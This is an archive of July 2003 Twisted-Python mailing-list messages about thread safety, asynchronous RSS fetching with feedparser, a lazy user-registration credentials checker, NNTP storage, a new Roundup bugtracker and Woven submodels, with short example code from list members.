> In the docs it says:
> 
> "This will make certain parts of Twisted thread-safe so you can use them
> safely. However, note that most parts of Twisted are not thread-safe."
> 
> What parts are still not thread-safe? My datastructures? They don't seem
> thread-safe.

In general, unless something in Twisted says it is thread-safe, it's not
thread-safe.  So, unless you are very sure about what you're doing, make
sure your threads don't share data with any other threads, including the
main-loop.  If they must share data, then use reactor.callFromThread -- a
thread can safely use callFromThread to call a function in the main
event-loop thread.

> Anyway, I still have a HUGE smile on my face.

Woo!  :)

-Andrew.




From radix at twistedmatrix.com  Fri Jul 11 20:29:31 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 11 Jul 2003 20:29:31 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712002931.GA1208@radii>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> I implemented a small newsfetching webserver today. At first I used some
> blocking code at startup and then reactor.callLater(some_intervall,
> sameBlockingMethod) to call it later and refresh the content later. It
> processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
> could see the output. I was quite happy about the result. Just for fun I
> tried to do the blocking code in a thread instead, - with mixed results.
> Read some more docs. And did a deferToThread for each call to the blocking
> method. Added a callback-method that parsed the results. A bit more hacking
> and ...then .. suddenly ... it was just .... so fast. No hogging the server
> at startup, all content fetched,, *much* faster than before. Everything
> seemed great. I had finally got the grip on threads and deferred. But
> something was wrong with my data. Some data were in the wrong lists etc. so
> I guess I need some mutex-locking or something. This is were you guys come
> in. Do I need to aquire a lock to avoid updating wrong parts of my
> datastructure?

Why are you even using threads? What API are you using that is only
available as blocking calls?

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From exarkun at twistedmatrix.com  Fri Jul 11 20:37:54 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Fri, 11 Jul 2003 20:37:54 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <004d01c34809$46f32030$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
Message-ID: <20030712003743.GA22695@intarweb.us>

On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> I implemented a small newsfetching webserver today. At first I used some
> blocking code at startup and then reactor.callLater(some_intervall,
> sameBlockingMethod) to call it later and refresh the content later. It
> processed about 8-10 RSS/RDF feeds and then handed my server back to me so I
> could see the output.

  Why is your RSS/RDF parser blocking?

  Jp
-- 
A disciple of another sect once came to Drescher as he was eating his
morning meal. "I would like to give you this personality test," said the
outsider, "because I want you to be happy." Drescher took the paper that was
offered him and put it into the toaster: "I wish the toaster to be happy, 
too."
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030711/936321df/attachment.pgp 

From 2002 at weholt.org  Fri Jul 11 20:56:20 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 02:56:20 +0200
Subject: [Twisted-Python] One big smile ...
References: <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
Message-ID: <005701c34810$68f725d0$0401a8c0@razor>

I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
each one to Mark Pilgrims Ultra Liberal Parser. The call to that
parse-method is actually what's being using in deferToThread. The I add a
callback-method which processes the result of the RSS/RDF-parsing. It's a
plain dictionary. This dictionary is processed into a simpler list. That's
it.

Alot of the things I'll be doing is like this; fetch a file from the net (
here the parser fetches it itself ), process the data returned from that
call and update some object or stuff the result into a database. The last
option most of the times probably, and the database will most likely be
SQLite which is not very thread-frinedly either. Other times it can be a
XML-RPC/SOAP-call which might take time to complete and the result of the
call might have to be processed. The last thing I can think of is scanning
folders and generating checksums. Probably the worst job of them all. Not
done often, but very time/resource-consuming when it occurs.

Most often I'll have to update something in the main thread, some state or
value, so if there's any way to use mutex/locks/whatever or ways to avoid
the whole thing I'm all ears ( one of the worlds most moronic statements
BTW ).

Thomas



----- Original Message -----
From: "Christopher Armstrong" <radix at twistedmatrix.com>
To: <twisted-python at twistedmatrix.com>
Sent: Saturday, July 12, 2003 2:29 AM
Subject: Re: [Twisted-Python] One big smile ...


> On Sat, Jul 12, 2003 at 02:05:16AM +0200, Thomas Weholt wrote:
> > I implemented a small newsfetching webserver today. At first I used some
> > blocking code at startup and then reactor.callLater(some_intervall,
> > sameBlockingMethod) to call it later and refresh the content later. It
> > processed about 8-10 RSS/RDF feeds and then handed my server back to me
so I
> > could see the output. I was quite happy about the result. Just for fun I
> > tried to do the blocking code in a thread instead, - with mixed results.
> > Read some more docs. And did a deferToThread for each call to the
blocking
> > method. Added a callback-method that parsed the results. A bit more
hacking
> > and ...then .. suddenly ... it was just .... so fast. No hogging the
server
> > at startup, all content fetched,, *much* faster than before. Everything
> > seemed great. I had finally got the grip on threads and deferred. But
> > something was wrong with my data. Some data were in the wrong lists etc.
so
> > I guess I need some mutex-locking or something. This is were you guys
come
> > in. Do I need to aquire a lock to avoid updating wrong parts of my
> > datastructure?
>
> Why are you even using threads? What API are you using that is only
> available as blocking calls?
>
> --
>  Twisted | Christopher Armstrong: International Man of Twistery
>   Radix  |          Release Manager,  Twisted Project
> ---------+     http://twistedmatrix.com/users/radix.twistd/
>
> _______________________________________________
> Twisted-Python mailing list
> Twisted-Python at twistedmatrix.com
> http://twistedmatrix.com/cgi-bin/mailman/listinfo/twisted-python
>
>




From radix at twistedmatrix.com  Fri Jul 11 21:12:13 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Fri, 11 Jul 2003 21:12:13 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <005701c34810$68f725d0$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <20030712011213.GB1208@radii>

On Sat, Jul 12, 2003 at 02:56:20AM +0200, Thomas Weholt wrote:
> I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
> each one to Mark Pilgrims Ultra Liberal Parser. The call to that
> parse-method is actually what's being using in deferToThread. The I add a
> callback-method which processes the result of the RSS/RDF-parsing. It's a
> plain dictionary. This dictionary is processed into a simpler list. That's
> it.
> 
> Alot of the things I'll be doing is like this; fetch a file from the net (
> here the parser fetches it itself ), process the data returned from that
> call and update some object or stuff the result into a database. The last
> option most of the times probably, and the database will most likely be
> SQLite which is not very thread-frinedly either. Other times it can be a
> XML-RPC/SOAP-call which might take time to complete and the result of the
> call might have to be processed. The last thing I can think of is scanning
> folders and generating checksums. Probably the worst job of them all. Not
> done often, but very time/resource-consuming when it occurs.
> 
> Most often I'll have to update something in the main thread, some state or
> value, so if there's any way to use mutex/locks/whatever or ways to avoid
> the whole thing I'm all ears ( one of the worlds most moronic statements
> BTW ).

The way to avoid the problems is to _avoid threads whenever you
can_. For database access, Twisted already has an asynchronous
interface in twisted.enterprise. It uses threads, but in an isolated
way. Fetching files from the net and parsing data is possible to do
asynchronously already (see twisted.web.client). Twisted has an asynch
client interface to XMLRPC, and a SOAP one should be easy enough to
implement (see how the XMLRPC client interface was done). The
file-walking stuff could probably be done well just by breaking up the
process into steps, allowing the reactor to do the work it needs to do
in between steps (i.e., reactor.callLater(0, doSomeWork), and at the
end of doSomeWork, reschedule doSomeWork, until all work is done).

Does your RSS parser actually try to download data itself? If it does,
I would recommend trying to figure out how to get at the lower level
parsing bits; download the data with twisted.web.client, and then pass
the data to the parsing bits. All asynchronous, no threads (with their
data corruption and deadlocks) to worry about.


The big idea I'm trying to get through is that you should not be
defaulting to threads. Most of your use cases are possible to do
without them; the only time that threads are really required is when
you are trying to use a blocking interface that you don't want to or
can't plausibly rework.

Good luck,
-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From dripton at ripton.net  Sat Jul 12 00:09:12 2003
From: dripton at ripton.net (David Ripton)
Date: Sat, 12 Jul 2003 00:09:12 -0400
Subject: [Twisted-Python] Lazily adding Identities in new cred
Message-ID: <3F0F89E8.3040001@ripton.net>

Hi,

I'm working on a turn-based game, with a server and N untrusted clients, 
using PB.

So far I just have a few hardcoded test users and passwords.  Now I'd 
like to add lazy user registration.  If a username is already known, 
then you need the password to log in.  If it's not known, you can claim 
that username by attempting to login, and your password should be 
immediately set to whatever you just used.

(I'm not saying this is the generally ideal way to add new users and 
assign their passwords, but it should definitely be doable in any 
reasonably flexible authentication framework.)

It appears that cred was not really designed to support this, because 
the password that the user entered is not passed to 
Authorizer.getIdentityRequest, which seems like the obvious place to 
lazily add an Identity.

Getting it there by patching Twisted would be easy enough: pass it from 
pb.authIdentity through AuthServ.remote_username into the call to 
getIdentityRequest.  The callers would always need to pass the password, 
but only a small percentage of Authorizers would actually use it, so 
this doesn't seem perfectly clean.  But I don't see a better alternative.

Suggestions?

-- 
David Ripton    dripton at ripton.net




From exarkun at twistedmatrix.com  Sat Jul 12 00:37:26 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sat, 12 Jul 2003 00:37:26 -0400
Subject: [Twisted-Python] Lazily adding Identities in new cred
In-Reply-To: <3F0F89E8.3040001@ripton.net>
References: <3F0F89E8.3040001@ripton.net>
Message-ID: <20030712043717.GA23859@intarweb.us>

On Sat, Jul 12, 2003 at 12:09:12AM -0400, David Ripton wrote:
> Hi,
> 
> I'm working on a turn-based game, with a server and N untrusted clients, 
> using PB.
> 
> So far I just have a few hardcoded test users and passwords.  Now I'd 
> like to add lazy user registration.  If a username is already known, 
> then you need the password to log in.  If it's not known, you can claim 
> that username by attempting to login, and your password should be 
> immediately set to whatever you just used.
> 
> (I'm not saying this is the generally ideal way to add new users and 
> assign their passwords, but it should definitely be doable in any 
> reasonably flexible authentication framework.)
> 
> It appears that cred was not really designed to support this, because 
> the password that the user entered is not passed to 
> Authorizer.getIdentityRequest, which seems like the obvious place to 
> lazily add an Identity.
> 
> Getting it there by patching Twisted would be easy enough: pass it from 
> pb.authIdentity through AuthServ.remote_username into the call to 
> getIdentityRequest.  The callers would always need to pass the password, 
> but only a small percentage of Authorizers would actually use it, so 
> this doesn't seem perfectly clean.  But I don't see a better alternative.
> 
> Suggestions?

  The best solution would seem to be to get PB working with the new cred
code -- which doesn't use Authorizers, Identities, or any of that confusion.

  Here's a simple credentials checker that adds all unrecognized usernames
that are requested (untested):

    from twisted import cred
    import twisted.cred.credentials
    import twisted.cred.checkers
    import twisted.cred.error

    from twisted.python.components import implements

    class LazyCredentialsChecker:
        __implements__ = (cred.checkers.ICredentialsChecker,)

        credentialInterfaces = (cred.credentials.IUsernamePassword,)

        def userExists(self, username):
            # Return true if username exists, false otherwise

        def getPassword(self, username):
            # Implement appropriately

        def addUser(self, username, password):
            # Here, too

        def requestAvatarId(self, creds):
            if implements(creds, cred.credentials.IUsernamePassword):
                if self.userExists(creds.username):
                    if self.getPassword(creds.username) == creds.password:
                        return creds.username
                    raise cred.error.UnauthorizedLogin()
                self.addUser(creds.username, creds.password)
                return creds.username
            raise NotImplementedError()

  An even nicer way to do this would be to create an interface for creating
a new user, (eg, IChargen), have requestAvatarId check for this interface,
and create the required entries in its database, rather than relying on the
non-existence of a username to create a new one (what if the user mistypes
their user?)

  Hope this helps,

  Jp

-- 
"The problem is, of course, that not only is economics bankrupt but it has
 always been nothing more than politics in disguise ... economics is a form
 of brain damage."  -- Hazel Henderson
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030712/5057f979/attachment.pgp 

From 2002 at weholt.org  Sat Jul 12 06:39:50 2003
From: 2002 at weholt.org (Thomas Weholt)
Date: Sat, 12 Jul 2003 12:39:50 +0200
Subject: [Twisted-Python] Storage for a NNTP-server?
Message-ID: <020001c34861$ec45c990$0401a8c0@razor>

Was wondering what I can use for storage for a NNTP-server? I'd like all of
my data to be kept in one place, data for a website, this news-server and
whatever else I might think of .... storing. Is that possible?

Would it be possible to require authentication for a few given groups, --
not all but some ?

I was wildly inspired by tnttprss.py I found on this list a few days back.
That was cool. But I don't want cog and/or pybsddb, because I allready got a
SQL-database running.

Best regards,
Thomas





From radix at twistedmatrix.com  Sat Jul 12 11:16:50 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 12 Jul 2003 11:16:50 -0400
Subject: [Twisted-Python] new bugtracker
Message-ID: <20030712151650.GA7767@radii>

I've finished setting up Roundup to replace our sourceforge based
bugtracker. I've migrated most of the open bugs that were on
sourceforge; so everyone go create a user and get crackin'.

http://twistedmatrix.com/users/roundup.twistd/twisted/

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From lafou at wanadoo.fr  Sat Jul 12 11:44:18 2003
From: lafou at wanadoo.fr (Philippe =?ISO-8859-1?Q?Lafoucri=E8re?=)
Date: 12 Jul 2003 17:44:18 +0200
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <20030712151650.GA7767@radii>
References: <20030712151650.GA7767@radii>
Message-ID: <1058024658.28521.0.camel@biproc>

On Sat, 2003-07-12 at 17:16, Christopher Armstrong wrote:
> I've finished setting up Roundup to replace our sourceforge based
> bugtracker. I've migrated most of the open bugs that were on
> sourceforge; so everyone go create a user and get crackin'.
> 
> http://twistedmatrix.com/users/roundup.twistd/twisted/

What will be the future of Issues ?




From radix at twistedmatrix.com  Sat Jul 12 11:54:07 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Sat, 12 Jul 2003 11:54:07 -0400
Subject: [Twisted-Python] new bugtracker
In-Reply-To: <20030712151650.GA7767@radii>
References: <20030712151650.GA7767@radii>
Message-ID: <20030712155407.GB7767@radii>

On Sat, Jul 12, 2003 at 11:16:50AM -0400, Christopher Armstrong wrote:
> I've finished setting up Roundup to replace our sourceforge based
> bugtracker. I've migrated most of the open bugs that were on
> sourceforge; so everyone go create a user and get crackin'.
> 
> http://twistedmatrix.com/users/roundup.twistd/twisted/

btw, I just made a nicer URL for this.

http://twistedmatrix.com/bugs/

Brought to you by Moshe's wonderful RewriteResource.

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From abe at fettig.net  Sat Jul 12 11:53:08 2003
From: abe at fettig.net (Abe Fettig)
Date: 12 Jul 2003 11:53:08 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <005701c34810$68f725d0$0401a8c0@razor>
References: <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii>  <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <1058025187.933.51.camel@mingus>

On Fri, 2003-07-11 at 20:56, Thomas Weholt wrote:
> I got a list of RSS/RDF-urls and I iterate thru them in sequence, feeding
> each one to Mark Pilgrims Ultra Liberal Parser. The call to that
> parse-method is actually what's being using in deferToThread. The I add a
> callback-method which processes the result of the RSS/RDF-parsing. It's a
> plain dictionary. This dictionary is processed into a simpler list. That's
> it.
> 
> Alot of the things I'll be doing is like this; fetch a file from the net (
> here the parser fetches it itself ), process the data returned from that
> call and update some object or stuff the result into a database.

While Mark's feedparser does include it's own code for downloading the
feed over HTTP, it doesn't make sense to use it in a Twisted app.  You
should let Twisted download the rss file, thus avoiding the need to run
feedparser in a seperate thread.  It's easy enough to use the feedparser
parsing code on it's own once you've downloaded the file - that's what I
do in Hep.

I've attached two examples.  The first downloads my RSS feed using
Twisted, parses it with feedparser, and prints the results.  As you can
see, it's only a few lines of code.  The second example does the same
thing, but runs the parsing code in a seperate thread, so that you avoid
blocking even for the small amount of time feedparser takes to parse the
RSS (whether it actually makes sense to do this depends on the needs of
your application).

Abe
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rss_demo.py
Type: text/x-python
Size: 407 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030712/25e187c9/attachment.py 
-------------- next part --------------
A non-text attachment was scrubbed...
Name: rss_demo2.py
Type: text/x-python
Size: 701 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030712/25e187c9/attachment-0001.py 

From m at moshez.org  Sat Jul 12 14:13:37 2003
From: m at moshez.org (Moshe Zadka)
Date: 12 Jul 2003 18:13:37 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058025187.933.51.camel@mingus>
References: <1058025187.933.51.camel@mingus>, <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii>  <005701c34810$68f725d0$0401a8c0@razor>
Message-ID: <20030712181337.16477.qmail@green.zadka.com>

On 12 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> I've attached two examples.  The first downloads my RSS feed using
> Twisted, parses it with feedparser, and prints the results.  As you can
> see, it's only a few lines of code.

Thanks a lot!
I would want, however, to comment on your examples and to show how
they could be a bit more "idiomatic".

from twisted.web.client import getPage
from feedparser import FeedParser
from twisted.internet import reactor, threads

def parsePage(data):
    parser = FeedParser()
    parser.feed(data)
    return parser

def formatParser(parser):
    return '\n'.join([parser.channel.get('title'), '']+
                     [i.get('title') for i in parser.items]+[''])

def getFormattedRSS(url):
    return getPage(url).addCallback(parsePage).addCallback(formatParser)

if __name__ == '__main__':
    import sys
    getFormattedRSS('http://www.fettig.net/?flav=rss'
    ).addCallback(sys.stdout.write
    ).addCallback(lambda _: reactor.stop()
    )
    reactor.run()

Note the "Golden rule": physically, the reactor.stop() and the reactor.run()
calls should be in physical proximity. This is a nice rule of thumb
for writing reusable code. Note, for example, how we can now use this
module (say, called formattedrss) to write resources:

import cgi
from twisted.web import resource, server
import formattedrss

class RSSFormatedResource(resource.Resource):

    def __init__(self, url):
        resource.Resource.__init__(self)
        self.url = url

    def render(self, request):
        getFormattedRSS(self.url).addCallback(request.write
        ).addCallback(lambda _: request.finish())
        return server.NOT_DONE_YET

or for implementing something useful for simple telnet clients:

from twisted.internet import protocol
from formattedrss import getFormattedRSS

class RSSFormattedProtocol(protocol.Protocol):

    def connectionMade(self):
        getFormattedRSS(self.factory.url).addCallback(self.transport.write
        ).addCallback(lambda _: self.transport.loseConnection())

class RSSFormattedFactory(protocol.Factory):
    protocol = RSSFormattedProtocol

    def __init__(self, url):
        self.url = url

if __name__ == '__main__':
    from twisted.internet import reactor
    reactor.listenTCP(1111,
                      RSSFormattedFactory('http://www.fettig.net/?flav=rss')

In general, this illustrates a not-completely-obvious technique: using
.addCallbacks to modify the return type of a deferred. This example
shows a common use for it: parsing raw data, and returning munged results.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From abe at fettig.net  Sat Jul 12 14:49:58 2003
From: abe at fettig.net (Abe Fettig)
Date: 12 Jul 2003 14:49:58 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712181337.16477.qmail@green.zadka.com>
References: <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <1058035798.1298.18.camel@mingus>

On Sat, 2003-07-12 at 14:13, Moshe Zadka wrote:
> Thanks a lot!
> I would want, however, to comment on your examples and to show how
> they could be a bit more "idiomatic".

Thanks, it's much appreciated.

> Note the "Golden rule": physically, the reactor.stop() and the reactor.run()
> calls should be in physical proximity. This is a nice rule of thumb
> for writing reusable code. Note, for example, how we can now use this
> module (say, called formattedrss) to write resources:

That makes a lot of sense.  Your examples were great - it's amazing how
easy it is to hook up a protocol to this kind of module. 

And, while you're in the mood for critiquing... 

Attached is a very small Twisted program I wrote last week as an
experiment with ApplicationServices.  It starts two simple services,
with a web interface that lets you start and stop them.  I was planning
to use this example as the basis for my first "What I've learned about
Twisted so far" article on my website, so suggestions/comments would be
great.

Abe
-------------- next part --------------
A non-text attachment was scrubbed...
Name: twisted-services-example.py
Type: text/x-python
Size: 1842 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030712/c777d87d/attachment.py 

From exarkun at twistedmatrix.com  Sat Jul 12 15:07:36 2003
From: exarkun at twistedmatrix.com (Jp Calderone)
Date: Sat, 12 Jul 2003 15:07:36 -0400
Subject: [Twisted-Python] Storage for a NNTP-server?
In-Reply-To: <020001c34861$ec45c990$0401a8c0@razor>
References: <020001c34861$ec45c990$0401a8c0@razor>
Message-ID: <20030712190725.GA4457@intarweb.us>

On Sat, Jul 12, 2003 at 12:39:50PM +0200, Thomas Weholt wrote:
> Was wondering what I can use for storage for a NNTP-server? I'd like all of
> my data to be kept in one place, data for a website, this news-server and
> whatever else I might think of .... storing. Is that possible?

  Anything that implements twisted.news.database.INewsStorage will do (Okay,
that class is new in CVS five minutes ago -- but all I did was rename
twisted.news.database.NewsStorage and make it inherit from Interface :).

> 
> Would it be possible to require authentication for a few given groups, --
> not all but some ?

  Sure would, but not without a few changes to the nntp code.  New cred
makes this kind of thing dead easy, if you want to give it a stab.

> 
> I was wildly inspired by tnttprss.py I found on this list a few days back.
> That was cool. But I don't want cog and/or pybsddb, because I allready got a
> SQL-database running.
> 

  There is an SQL INewsStorage implementation, but I'm not really sure what
state it is in, or if it was ever any good to begin with.  The most
used/tested NewsStorage is based on twisted.persisted.dirdbm.  It works
alright for small numbers of groups/articles, but I doubt it scales well.

  A filepile based NewsStorage would probably work very well, but I don't
yet know filepile well enough to undertake this :)

  Jp

-- 
It is practically impossible to teach good programming style to
students that have had prior exposure to BASIC: as potential
programmers they are mentally mutilated beyond hope of
regeneration.        -- Dijkstra
-------------- next part --------------
A non-text attachment was scrubbed...
Name: not available
Type: application/pgp-signature
Size: 189 bytes
Desc: not available
Url : http://twistedmatrix.com/pipermail/twisted-python/attachments/20030712/5a84325d/attachment.pgp 

From m at moshez.org  Sat Jul 12 19:05:05 2003
From: m at moshez.org (Moshe Zadka)
Date: 12 Jul 2003 23:05:05 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058035798.1298.18.camel@mingus>
References: <1058035798.1298.18.camel@mingus>, <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
Message-ID: <20030712230505.27817.qmail@green.zadka.com>

On 12 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> class SimpleService(app.ApplicationService):
>     def startService(self):
>         self.serviceRunning = 1

Call the father's method first, instead:
app.ApplicationService.startService(self)
...
Ditto for stopService(self).
They are responsible for setting .serviceRunning

>         reactor.callLater(0, self.printHello)

Why not self.nextCall = reactor.callLater(0, ...)?

>     def stopService(self):
>         self.serviceRunning = 0
>         if hasattr(self, 'nextCall'): 
>             self.nextCall.cancel()
>             del(self.nextCall)
>         print "%s: Stopped." % self.serviceName

You also want to avoid persisting nextCall

def __getstate__(self):
    d = self.__dict__
    if 'nextCall' in d:
        del d['nextCall']
    return d

> class ServiceWebManager(resource.Resource):
>     isLeaf = 1
> 
>     def __init__(self, app):
>         self.app = app
> 
>     def render(self, request):
>         serviceName = request.args.get('service', [''])[0]
>         action = request.args.get('action', [''])[0]
>         if serviceName:
>             service = self.app.getServiceNamed(serviceName)
>             if action == 'Start':
>                 service.startService()
>             else:
>                 service.stopService()
>             request.redirect('/')

Note that your service has a bug if .startService() is called
twice without an intervening stopService(), and you present
here for users an ability to tickle that bug. You can probably
work around in many ways...

...but I prefer to having non-parents .enable() or .disable()
the service. Of course, it can start enabled by default, but
this way you have a clear distinction which methods are supposed
to be called by whom.
 
> myApp = app.Application("Test App")
> SimpleService("Service 1", myApp)
> SimpleService("Service 2", myApp)
> website = server.Site(ServiceWebManager(myApp))
> myApp.listenTCP(8008, website)

If you call it "application" insteadof "myApp", the next line
is not needed: instead of "Python"ing it, "twistd -y" it
[or maybe twistd -ny if you don't want forking]

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From bob at redivi.com  Sat Jul 12 19:47:37 2003
From: bob at redivi.com (Bob Ippolito)
Date: Sat, 12 Jul 2003 19:47:37 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030712230505.27817.qmail@green.zadka.com>
Message-ID: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>

On Saturday, Jul 12, 2003, at 19:05 America/New_York, Moshe Zadka wrote:

> You also want to avoid persisting nextCall
>
> def __getstate__(self):
>     d = self.__dict__
>     if 'nextCall' in d:
>         del d['nextCall']
>     return d

Note that you shouldn't actually do it like that, you should do it like 
this:

def __getstate__(self):
	d = self.__dict__.copy()
	if 'nextCall' in d:
		del d['nextCall']
	return d

It's never ever a good idea to _break_ your live instances the instant 
they get serialized.

-bob




From mary-twisted at puzzling.org  Sat Jul 12 22:21:36 2003
From: mary-twisted at puzzling.org (Mary)
Date: Sun, 13 Jul 2003 12:21:36 +1000
Subject: [Twisted-Python] Woven: access to submodels
Message-ID: <20030713022136.GB1862@titus.home.puzzling.org>

I'm trying to replicate the functionality of http://eyes.puzzling.org/
(currently powered by a bunch of Python CGI scripts running on an Apache
webserver) in Woven.

eyes.puzzling.org is a kind of a minimalist blog, with pages that list
recent entries, the authors of the entries, and so on.

At the moment, I'm trying to replicate the authors functionality (2
different sets of pages: one which lists all the authors and links to
their individual page; and one for each author, which lists their
individual articles.

The /authors/ page (listing all the authors and linking to their
individual page) is generated by objects of the AuthorsPage subclass.

For each author, I would like to generate a /author/AUTHORNAME/ page
which lists their individual entries. I am trying to create these pages
from AuthorsPage's getDynamicChild method. The idea is to pass the
already constructed submodel -- a dictionary representing the individual
author -- to the IndividualPage object I will construct to represent the
individual author's page, rather than have IndividualPage make its own
database query for that information.

At present, as you can see below, I'm using getSubmodel to retrieve
the (dictionary) submodel associated with a particular author. However,
this returns a twisted.web.woven.model.DeferredWrapper instance, rather
than the dictionary itself. Should I make IndividualPage add callbacks
to the DeferredWrapper, or am I missing something crucial about
retrieving submodels or is this model more fundamentally incorrect?

For example, should I be passing submodels around like that at all?

If so, is there a higher level call I should make to access the
submodel?

The two classes following are the AuthorsPage and IndividualPage classes
described above.

Thanks,

-Mary

class IndividualPage(page.Page):
 
    # getTemplate munges two template files together
    template = getTemplate("/home/mary/cvs/Projects/Eye/author-page.html")

    def initialize(self, *args, **kwargs):
        self.amodel = kwargs['amodel']

    def wmfactory_author(self, request):
        return self.amodel['author']
        
class AuthorsPage(page.Page):

    template = getTemplate("/home/mary/cvs/Projects/Eye/authors-page.html")

    def initialize(self, *args, **kwargs):
        self.dbpool = kwargs['pool']
        self.authors = None

    def wmfactory_authors(self, request):
        query = self.dbpool.runQuery("SELECT DISTINCT posts.name, link, password FROM authors, posts WHERE authors.name = posts.name ORDER BY name;")
        query.addCallback(self.makeAuthors)
        return query
    
    def makeAuthors(self, rows):
        '''
        Construct self.authors, return them as a list
        @return a list of author dictionaries
        '''
        authors = {}
        for row in rows:
            (name, link, password) = row
            authors[name] = {
                'name' : name,
                'link' : link,
                'password' : password
            }
        return authors

    def wvfactory_alink(self, request, node, model):
        return AuthorLink(model)

    def getDynamicChild(self, name, request):
        return IndividualPage(amodel=self.getSubmodel('authors')[name]))



From m at moshez.org  Sun Jul 13 00:29:51 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 04:29:51 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>
References: <37D9D4F6-B4C3-11D7-B516-000A95686CD8@redivi.com>
Message-ID: <20030713042951.8615.qmail@green.zadka.com>

[Me]
> You also want to avoid persisting nextCall
>
> def __getstate__(self):
>     d = self.__dict__
>     if 'nextCall' in d:
>         del d['nextCall']
>     return d

[Bob]
> Note that you shouldn't actually do it like that, you should do it like 
> this:
> 
> def __getstate__(self):
> 	d = self.__dict__.copy()
> 	if 'nextCall' in d:
> 		del d['nextCall']
> 	return d
> 
> It's never ever a good idea to _break_ your live instances the instant 
> they get serialized.

Right, I meant to write ".copy()". Thanks for the fix!

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Sun Jul 13 00:36:13 2003
From: m at moshez.org (Moshe Zadka)
Date: 13 Jul 2003 04:36:13 -0000
Subject: [Twisted-Python] Woven: access to submodels
In-Reply-To: <20030713022136.GB1862@titus.home.puzzling.org>
References: <20030713022136.GB1862@titus.home.puzzling.org>
Message-ID: <20030713043613.8689.qmail@green.zadka.com>

On Sun, 13 Jul 2003, Mary <mary-twisted at puzzling.org> wrote:

>     def getDynamicChild(self, name, request):
>         return IndividualPage(amodel=self.getSubmodel('authors')[name]))

Rar! You are very evil.
Please do not reinvent SQL in Python: write *another* select query, that
only selects posts from this author.
 
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From jml at ids.org.au  Sun Jul 13 13:18:08 2003
